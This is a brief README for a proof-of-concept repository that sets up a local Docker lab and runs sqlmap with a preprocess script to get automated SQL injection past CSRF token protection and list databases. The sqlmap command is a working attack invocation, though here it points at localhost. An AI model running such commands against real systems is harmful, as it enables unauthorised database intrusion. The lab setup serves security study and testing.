# CSRF SQLMap Bypass 💉

### Setup

```
git clone https://github.com/itasahobby/CSRF_SQLMap_Bypass.git
docker-compose -f .\docker\docker-compose.yaml up --build
```

### PoC

Run the following sqlmap command:
```
sqlmap -u "http://localhost/index.php?action=0" --method GET --preprocess ./poc/preprocess.py --batch --dbs
```

There is a more in depth writeup in my [blog](https://itasahobby.gitlab.io/posts/sqlmapcsrf/).
### Mentions

Idea inspired by [**Dreg**](https://github.com/David-Reguera-Garcia-Dreg/) 
